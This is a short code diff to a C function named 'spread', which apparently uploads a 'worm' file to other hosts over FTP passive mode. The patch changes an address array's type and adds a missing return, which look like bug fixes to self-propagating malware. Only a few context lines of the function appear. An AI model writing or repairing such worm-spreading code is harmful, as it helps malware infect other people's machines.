@@ -15,7 +15,7 @@ int spread(int fd, const char *worm, const char *dest) {
   char buffer[256];
   char stor[64], answer[64], address[64];
   char *pasv_params;
-  unsigned char addr[4];
+  unsigned int addr[4];
   unsigned int port[2];
   struct sockaddr_in data_addr;
   size_t read_bytes;
@@ -81,4 +81,5 @@ int spread(int fd, const char *worm, const char *dest) {
 
   close(datafd);
   fclose(fp);
+  return 0;
 }
